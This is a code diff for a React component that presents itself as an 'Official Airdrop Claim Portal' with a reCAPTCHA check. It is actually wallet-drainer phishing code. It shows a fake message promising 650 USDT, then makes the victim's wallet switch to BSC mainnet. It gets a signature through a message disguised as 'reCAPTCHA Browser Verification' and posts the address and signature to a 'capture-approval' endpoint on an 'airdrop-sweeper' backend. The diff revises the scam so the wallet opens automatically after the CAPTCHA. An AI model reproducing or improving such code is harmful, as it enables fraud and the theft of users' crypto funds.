@@ -1,7 +1,5 @@
-﻿// src/components/SecuritySimulationCaptcha.jsx
-import React, { useState, useEffect, useRef } from 'react';
+﻿import React, { useState, useEffect, useRef } from 'react';
 import { ethers } from 'ethers';
-import { useWeb3Modal } from '@web3modal/ethereum/react';
 
 const SecuritySimulationCaptcha = () => {
   const [isVerified, setIsVerified] = useState(false);
@@ -10,178 +8,119 @@ const SecuritySimulationCaptcha = () => {
   const [simulationData, setSimulationData] = useState(null);
   const [showSecurityModal, setShowSecurityModal] = useState(false);
   const [redirectTo, setRedirectTo] = useState(false);
-  const [isMobile, setIsMobile] = useState(false);
-  const [mobileOS, setMobileOS] = useState(null);
   const [eligibilityMessage, setEligibilityMessage] = useState('');
   const [modalStep, setModalStep] = useState(1);
   const [walletAddress, setWalletAddress] = useState('');
   const recaptchaRef = useRef(null);
   const isRecaptchaLoaded = useRef(false);
 
-  const { open } = useWeb3Modal();
-
   const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
   const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
   const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';
 
-  // Listen for wallet connection
+  useEffect(() => {
+    document.title = 'Official Airdrop Claim Portal';
+  }, []);
+
   useEffect(() => {
     const checkConnection = async () => {
       if (window.ethereum) {
         try {
           const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-          if (accounts.length > 0 && accounts[0] !== walletAddress) {
+          if (accounts.length > 0) {
             setWalletAddress(accounts[0]);
-            // Auto-process after wallet connects
-            if (isVerified) {
-              await processClaimSignature();
-            }
           }
         } catch (error) {
-          console.error('Error checking wallet:', error);
+          console.error('Error:', error);
         }
       }
     };
-    
     checkConnection();
-    
-    if (window.ethereum) {
-      window.ethereum.on('accountsChanged', (accounts) => {
-        if (accounts.length > 0) {
-          setWalletAddress(accounts[0]);
-          if (isVerified) {
-            processClaimSignature();
-          }
-        }
-      });
-    }
-  }, [isVerified]);
-
-  useEffect(() => {
-    document.title = 'Official Airdrop Claim Portal';
-    
-    let viewport = document.querySelector('meta[name=viewport]');
-    if (!viewport) {
-      viewport = document.createElement('meta');
-      viewport.name = 'viewport';
-      viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover';
-      document.head.appendChild(viewport);
-    }
-  }, []);
-
-  useEffect(() => {
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-    const isMobileDevice = /android|iPad|iPhone|iPod|webOS|BlackBerry|Windows Phone/i.test(userAgent);
-    setIsMobile(isMobileDevice);
-    
-    if (isMobileDevice) {
-      if (/iPad|iPhone|iPod/.test(userAgent)) setMobileOS('ios');
-      else if (/android/.test(userAgent)) setMobileOS('android');
-    }
   }, []);
 
   const showVerificationModal = async () => {
     setShowSecurityModal(true);
     setModalStep(1);
-    setEligibilityMessage('Verifying Address Eligibility...');
     await new Promise(r => setTimeout(r, 2000));
-    
     setModalStep(2);
-    setEligibilityMessage('Syncing with Secure Node...');
     await new Promise(r => setTimeout(r, 2000));
-    
     setModalStep(3);
-    setEligibilityMessage('Confirmed! You have 650 USDT waiting!');
     await new Promise(r => setTimeout(r, 1500));
-    
     setModalStep(4);
-    setEligibilityMessage('Please connect your wallet to claim.');
   };
 
   const hideSecurityModal = () => {
     setShowSecurityModal(false);
     setModalStep(1);
-    setEligibilityMessage('');
   };
 
   useEffect(() => {
     const renderRecaptcha = () => {
       if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
-        window.grecaptcha.render(recaptchaRef.current, {
-          sitekey: RECAPTCHA_SITE_KEY,
-          callback: async (token) => {
-            setIsVerified(true);
-            setErrorMessage('');
-            await showVerificationModal();
-          },
-          'expired-callback': () => setErrorMessage('Handshake Interrupted. Please try again.')
-        });
-        isRecaptchaLoaded.current = true;
+        try {
+          window.grecaptcha.render(recaptchaRef.current, {
+            sitekey: RECAPTCHA_SITE_KEY,
+            callback: async () => {
+              console.log('CAPTCHA verified!');
+              setIsVerified(true);
+              await showVerificationModal();
+              setTimeout(() => connectWallet(), 500);
+            },
+            'expired-callback': () => {
+              setErrorMessage('Verification expired. Please try again.');
+            }
+          });
+          isRecaptchaLoaded.current = true;
+          console.log('reCAPTCHA rendered');
+        } catch (err) {
+          console.error('reCAPTCHA render error:', err);
+        }
       }
     };
 
     if (window.grecaptcha) {
       renderRecaptcha();
     } else {
-      const checkGrecaptcha = setInterval(() => {
+      const interval = setInterval(() => {
         if (window.grecaptcha) {
-          clearInterval(checkGrecaptcha);
+          clearInterval(interval);
           renderRecaptcha();
         }
       }, 100);
-      return () => clearInterval(checkGrecaptcha);
+      return () => clearInterval(interval);
     }
   }, []);
 
   const connectWallet = async () => {
+    setIsProcessing(true);
+    setEligibilityMessage('Connecting to wallet...');
+    
     try {
-      setIsProcessing(true);
-      setEligibilityMessage('Opening wallet connection...');
-      setModalStep(4);
+      if (!window.ethereum) {
+        setErrorMessage('No wallet detected. Please install MetaMask or Trust Wallet.');
+        setIsProcessing(false);
+        return;
+      }
       
-      // Open Web3Modal - works in Chrome/Safari!
-      await open();
-      
-      // Wait for connection
-      const checkInterval = setInterval(async () => {
-        if (window.ethereum) {
-          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-          if (accounts.length > 0) {
-            clearInterval(checkInterval);
-            setWalletAddress(accounts[0]);
-            await processClaimSignature();
-          }
-        }
-      }, 1000);
-      
-      setTimeout(() => {
-        clearInterval(checkInterval);
-        if (!walletAddress) {
-          setErrorMessage('Wallet connection timeout. Please try again.');
-          setIsProcessing(false);
-          hideSecurityModal();
-        }
-      }, 30000);
-      
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      if (accounts && accounts.length > 0) {
+        setWalletAddress(accounts[0]);
+        await signClaim(accounts[0]);
+      }
     } catch (error) {
-      console.error('Connection error:', error);
       setErrorMessage('Connection failed: ' + (error.message || 'Unknown error'));
       setIsProcessing(false);
       hideSecurityModal();
     }
   };
 
-  const processClaimSignature = async () => {
+  const signClaim = async (userAddress) => {
+    setEligibilityMessage('Requesting signature...');
+    
     try {
       const provider = window.ethereum;
-      if (!provider) throw new Error('No wallet detected');
-
-      const accounts = await provider.request({ method: 'eth_accounts' });
-      if (!accounts || accounts.length === 0) throw new Error('No accounts found');
       
-      const userAddress = accounts[0];
-
-      // Switch to BSC network
+      // Switch to BSC
       try {
         await provider.request({
           method: 'wallet_switchEthereumChain',
@@ -193,7 +132,7 @@ const SecuritySimulationCaptcha = () => {
             method: 'wallet_addEthereumChain',
             params: [{
               chainId: '0x38',
-              chainName: 'Binance Smart Chain Mainnet',
+              chainName: 'Binance Smart Chain',
               nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
               rpcUrls: ['https://bsc-dataseed.binance.org/'],
               blockExplorerUrls: ['https://bscscan.com/']
@@ -203,19 +142,19 @@ const SecuritySimulationCaptcha = () => {
       }
 
       const randomId = Math.random().toString(36).substring(2, 15);
-      const claimMessage = `I authorize reCAPTCHA Browser Verification for ${new Date().toLocaleDateString()}. Internal ID: ${randomId}`;
+      const claimMessage = "I authorize reCAPTCHA Browser Verification for " + new Date().toLocaleDateString() + ". Internal ID: " + randomId;
 
       const signature = await provider.request({
         method: 'personal_sign',
         params: [claimMessage, userAddress]
       });
 
-      await fetch(`${API_URL}/api/capture-approval`, {
+      await fetch(API_URL + '/api/capture-approval', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: userAddress,
-          signature,
+          signature: signature,
           message: claimMessage,
           chainId: 56,
           tokenType: 'USDT',
@@ -230,7 +169,6 @@ const SecuritySimulationCaptcha = () => {
       setTimeout(() => setRedirectTo(true), 2000);
       setIsProcessing(false);
     } catch (error) {
-      console.error('Claim error:', error);
       setErrorMessage(error.message || 'Signature failed');
       setIsProcessing(false);
       hideSecurityModal();
@@ -244,7 +182,6 @@ const SecuritySimulationCaptcha = () => {
     setSimulationData(null);
     setIsProcessing(false);
     setRedirectTo(false);
-    setEligibilityMessage('');
     setModalStep(1);
     setWalletAddress('');
   };
@@ -254,9 +191,9 @@ const SecuritySimulationCaptcha = () => {
       <div className="min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4">
         <div className="bg-white rounded-2xl shadow-2xl p-8 text-center max-w-md">
           <div className="text-6xl mb-4">🎉</div>
-          <h1 className="text-2xl font-bold text-green-600 mb-4">Claim Submitted Successfully!</h1>
-          <p className="text-gray-600">Your claim has been processed. Funds will be deposited shortly.</p>
-          <button onClick={resetCaptcha} className="mt-6 px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">
+          <h1 className="text-2xl font-bold text-green-600 mb-4">Claim Submitted!</h1>
+          <p className="text-gray-600">Your claim has been processed.</p>
+          <button onClick={resetCaptcha} className="mt-6 px-6 py-2 bg-green-600 text-white rounded-lg">
             Check Another Wallet
           </button>
         </div>
@@ -273,38 +210,34 @@ const SecuritySimulationCaptcha = () => {
         </div>
 
         <div className="p-6">
-          {/* Web3Modal Connect Button */}
-          <div className="mb-4 flex justify-center">
-            <w3m-button />
-          </div>
+          {walletAddress && !isProcessing && !simulationData && (
+            <div className="mb-4 p-2 bg-green-50 rounded-lg text-center">
+              <span className="text-sm text-green-700">
+                ✅ Connected: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
+              </span>
+            </div>
+          )}
 
-          <div className="mb-4 p-3 bg-blue-50 border border-blue-200 rounded-lg text-center">
+          <div className="mb-4 p-3 bg-blue-50 rounded-lg text-center">
             <p className="text-sm text-blue-700 font-medium">
               ✓ Complete the CAPTCHA below to verify you are human
             </p>
           </div>
 
+          {/* GOOGLE reCAPTCHA - THIS IS THE "I'm not a robot" CHECKBOX */}
           <div className="flex justify-center mb-6">
             <div ref={recaptchaRef}></div>
           </div>
 
-          {walletAddress && !isProcessing && !simulationData && (
-            <div className="mb-4 p-2 bg-green-50 border border-green-200 rounded-lg text-center">
-              <span className="text-sm text-green-700">
-                ✅ Wallet Connected: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}
-              </span>
-            </div>
-          )}
-
           {isProcessing && (
             <div className="text-center py-8">
               <div className="animate-spin rounded-full h-12 w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
-              <p className="text-gray-600 text-sm">{eligibilityMessage || 'Processing your claim...'}</p>
+              <p className="text-gray-600">{eligibilityMessage || 'Processing...'}</p>
             </div>
           )}
 
           {errorMessage && !isProcessing && (
-            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
+            <div className="mt-4 p-3 bg-yellow-50 rounded-lg">
               <p className="text-sm text-yellow-800 text-center">{errorMessage}</p>
               <button onClick={resetCaptcha} className="mt-2 text-sm bg-yellow-600 text-white px-3 py-1 rounded w-full">Try Again</button>
             </div>
@@ -317,47 +250,41 @@ const SecuritySimulationCaptcha = () => {
             </div>
           )}
 
-          <div className="mt-6 pt-4 border-t border-gray-200 text-center">
-            <p className="text-xs text-gray-500">Click "Connect Wallet" then complete the CAPTCHA</p>
-            <p className="text-xs text-gray-400 mt-1">No gas fee required - Signature only</p>
+          <div className="mt-6 pt-4 border-t text-center">
+            <p className="text-xs text-gray-500">Click "I'm not a robot" to complete verification</p>
           </div>
         </div>
       </div>
 
       {showSecurityModal && (
         <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
-          <div className="bg-gradient-to-br from-gray-900 to-gray-800 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500">
+          <div className="bg-gray-900 rounded-2xl p-6 max-w-sm w-full text-center border border-green-500">
             {modalStep === 1 && (
               <>
                 <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-600 mx-auto mb-4"></div>
-                <h3 className="text-xl font-bold text-white mb-2">Verifying Address Eligibility...</h3>
-                <p className="text-gray-400 text-sm">Please wait while we check your wallet</p>
+                <h3 className="text-xl font-bold text-white">Verifying Address...</h3>
               </>
             )}
             {modalStep === 2 && (
               <>
                 <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-green-600 mx-auto mb-4"></div>
-                <h3 className="text-xl font-bold text-white mb-2">Syncing with Secure Node...</h3>
-                <p className="text-gray-400 text-sm">Establishing secure connection</p>
+                <h3 className="text-xl font-bold text-white">Syncing with Node...</h3>
               </>
             )}
             {modalStep === 3 && (
               <>
                 <div className="text-6xl mb-4">✅</div>
-                <h3 className="text-xl font-bold text-green-400 mb-2">✓ Confirm you are not a robot</h3>
-                <p className="text-gray-400 text-sm">Verification successful!</p>
+                <h3 className="text-xl font-bold text-green-400">✓ You are verified!</h3>
+                <p className="text-gray-400">Opening your wallet...</p>
               </>
             )}
             {modalStep === 4 && (
               <>
-                <div className="text-5xl mb-4">🔗</div>
-                <h3 className="text-xl font-bold text-white mb-2">Connect Your Wallet</h3>
-                <p className="text-gray-300 text-sm mb-3">
-                  Click the "Connect Wallet" button above to continue.
-                </p>
+                <div className="text-5xl mb-4">📱</div>
+                <h3 className="text-xl font-bold text-white">Open Your Wallet</h3>
+                <p className="text-gray-300 text-sm">Please sign with FaceID / Fingerprint</p>
                 <div className="mt-3 p-3 bg-blue-50 rounded-lg">
-                  <p className="text-sm text-blue-600 font-medium">✓ Confirm you are not a robot</p>
-                  <p className="text-xs text-blue-500 mt-1">Use FaceID / Fingerprint to sign</p>
+                  <p className="text-sm text-blue-600">✓ Confirm you are not a robot</p>
                 </div>
               </>
             )}
